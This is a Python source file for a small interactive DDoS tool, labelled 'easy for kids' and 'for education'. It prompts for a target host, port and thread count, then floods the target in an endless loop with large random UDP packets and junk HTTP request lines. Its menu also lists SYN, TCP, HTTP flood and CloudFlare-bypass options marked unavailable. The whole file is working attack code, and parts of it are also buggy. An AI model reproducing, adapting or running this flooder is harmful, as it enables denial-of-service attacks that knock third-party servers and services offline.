
"""

    CODED BY DR4G0N5
    SMALL TOOLS/EASY FOR KIDS DDOS
    INDONESIAN, JATIM.
    THIS TOOLS FOR EDUCATION

"""

import os
import sys
import socket, socks
import threading
import time
import random
import urllib3
import subprocess
from random import randint
from etc.set import clear
from sys import stdout
from etc.set import *
from etc.banner import banner_drgn
#from tools.test import test_open

urllib3.disable_warnings()
urllib3.PoolManager()

ip1 = randint(0, 250)
ip2 = randint(0, 250)
ip3 = randint(0, 250)
ip4 = randint(0, 250)

threads      = int(0)
ip_target    = str(0)
port_target  = int(0)
total_attack = int(0)
choice       = int(0)
multi        = int(250)
random_ip    = str(ip1)+'.'+str(ip1)+'.'+str(ip1)+'.'+str(ip1)

ERROR_MSG   = '\u001b[1m[u001b[1m[\u001b[31mERROR\u001b[0m\u001b[1m]\u001b[0m'
WARNING_MSG = '[WARN]'
SUCCESS_MSG = '[\u001b[32;1mSUCCESS\u001b[0m]'

NFound='\n\u001b[1m[\u001b[31mNot Found Choice!\u001b[0m\u001b[1m]\u001b[0m'
Aborted='\n\u001b[1m[\u001b[31mABORTED!\u001b[0m\u001b[1m]\u001b[0m'
IP_NOTFOUND='\n\u001b[1m[\u001b[31mNOT FOUND IP!\u001b[0m\u001b[1m]\u001b[0m'

class ddos_udp:
    def __init__(self):

        clear()
        banner_drgn()
        try:

            port = int(0)
            times = int(0)
            bands = int(0)
            delays = int(0)
            size = int(0)

            print(f'\u001b[1m[\u001b[32;1m01\u001b[0m\u001b[1m]\u001b[0m Python ..... {SUCES_SYM}',
                f'\n\u001b[1m[\u001b[32;1m02\u001b[0m\u001b[1m]\u001b[0m Perl ....... {ERROR_SYM}')
            try:
                x = input(promt_choice)
                if x == '1':
                    self.udp_floo()
                if x == '2':
                    self.udp_floo()
                    clear()
                    banner_drgn()
                    IP_TARG = input(f'{PULS} Target: ')
                    PORT_TARG = int(input(f'{PULS} Port: '))
                    TIMES     = input(f'{PULS} Time: ')
                    BAND_WIT  = input(f'{PULS} BandWidth: ')
                    SIZE      = input(f'{PULS} Size: ')
                    DELAYS    = input(f'{PULS} Delay: ')
                    port = PORT_TARG
                    times = TIMES
                    bands = BAND_WIT
                    delays = DELAYS
                    size = SIZE
                    if PORT_TARG == '':
                        try:

                            if 'https' in PORT_TARG:
                                port = int(443)
                            else:
                                port = int(80)

                        except:
                            pass
                    elif TIMES == '':
                        try:
                            times = int(120)
                        except:
                            pass
                    elif BAND_WIT == '':
                        try:
                            bands = int(2000)
                        except:
                            pass
                    elif DELAYS == '':
                        try:
                            delays = int(5)
                        except:
                            pass
                    elif SIZE == '':
                        try:
                            size = int(60)
                        except:
                            pass
                    else:
                        try:
                            sys.exit(NFound)
                        except:
                            pass

                    """
                    ht = "{} --port {} --time {} --bandwidth {} --delay {} --size{}".format(str(IP_TARG), int(port), int(times), int(bands), int(delays), int(size))
                    test_open(str(IP_TARG), int(port), int(times), int(bands), int(delays), int(size))
                    var = ''
                    pipe = subprocess.Popen(["perl", "./udpflood.pl ", var], stdin=subprocess.PIPE)
                    pipe.stdin.write(var)
                    pipe.stdin.close()
                    """

            except (KeyboardInterrupt, ValueError):
                sys.exit(Aborted)

        except KeyboardInterrupt:
            sys.exit(Aborted)

    def udp_floo(self):

            clear()
            banner_drgn()
            try:
                self.target()
                self.port()
                self.thread()
                self.start()
            except KeyboardInterrupt:
                sys.exit(Aborted)

    def target(self):

        global ip_target
        try:

            ip_targets = input(f'{PULS} IP Target : ')
            if len(ip_targets) <= 5 or ip_targets == '':
                sys.exit(f'{IP_NOTFOUND}')
            elif '.' not in ip_targets:
                sys.exit(IP_NOTFOUND)
            else:
                ip_target = ip_targets
                time.sleep(0.2)
            ip_target = ip_targets
            try:
                try:
                    if ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "www.":
                        ip_targets = "http://" + ip_targets
                    elif ip_targets[0]+ip_targets[1]+ip_targets[2]+ip_targets[3] == "http":
                        pass
                    else:
                        ip_targets = "http://" + ip_targets
                except:
                    self.target()
                try:
                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
                except:
                    self.host = ip_targets.replace("http://", "").replace("https://", "").split("/")[0]
                ip_host = socket.gethostbyname(self.host)


            except:
                self.target()


        except KeyboardInterrupt:
            sys.exit(Aborted)


    def port(self):

        global port_target
        global port_targets
        try:

            port_targets = str(input(f'{PULS} Port Target: '))
            if port_targets == '':
                if 'https' in ip_target:
                    port_target = int(443)
                else:
                    port_target = int(80)
            elif len(port_targets) == '1':
                port_target = int(80)
            else:
                port_target = port_targets
                time.sleep(0.2)

        except ValueError:
            port_target = int(80)

    def thread(self):

        global threads
        try:
            thread_c = int(input(f'{PULS} Thread[2000]: '))
            if thread_c == '':
                threads = 2000
                self.start()
            else:
                threads += thread_c
                self.start()
        except ValueError:
            threads = 2000

    def start(self):

        global ip_target, port_target, threads
        clear()
        print(f'''
    {PULS} IP TARGET   : {str(ip_target)}
    {PULS} PORT TARGET : {int(port_target)}
    {PULS} THREADS     : {int(threads)}''')
        ready = input(f'\n\n  {PULS} ENTER TO LAUNCH.')
        if ready == '':
            self.udp_flood(ip_target, port_target)
        else:
            self.udp_flood(ip_target, port_target)

    def udp_flood(self, target, port):
        global total_attack, multi
        bytes  = random._urandom(50000)
        t_g    = (str(target), int(port))
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                total_attack += 1
                s.sendto(bytes,t_g)
                s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
                sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                sys.stdout.flush()
                try:
                    for i in range(str(multi)):
                        s.sendto(bytes,t_g)
                        total_attack += 1
                        s.sendto(('GET /'+target+'HTTP/1.1\r\n'+'Host: '+random_ip+'\r\n\r\n').encode('ascii'), (target, port))
                        sys.stdout.write(f'{PULS} Flooding: '+str(ip_target)+' | Paket Dikirim ['+total_attack+']\r')
                        sys.stdout.flush()
                except:
                    try:
                        s.close()
                    except:
                        pass

            except:
                try:
                    s.close()
                except:
                    pass

def tools_list():
    clear()
    banner_drgn()
    print(f'''
   \u001b[1m[\u001b[32;1m01\u001b[0m\u001b[1m]\u001b[0m UDP FLOOD ........... {SUCES_SYM}
   \u001b[1m[\u001b[32;1m02\u001b[0m\u001b[1m]\u001b[0m SYN FLOOD ........... {ERROR_SYM}
   \u001b[1m[\u001b[32;1m03\u001b[0m\u001b[1m]\u001b[0m TCP FLOOD ........... {ERROR_SYM}
   \u001b[1m[\u001b[32;1m04\u001b[0m\u001b[1m]\u001b[0m CloudFlare Bypass ... {ERROR_SYM}
   \u001b[1m[\u001b[32;1m05\u001b[0m\u001b[1m]\u001b[0m HTTP FLOOD .......... {ERROR_SYM}\n''')
    try:
        x = input(promt_choice)
        if len(x) == 3:
            sys.exit(NFound)
        elif (x == '1') or (x == '01'):
            ddos_udp()
        else:
            sys.exit(NFound)
    except ValueError:
        sys.exit(NFound)

if __name__ == '__main__':
    try:

        tools_list()

    except:
        pass
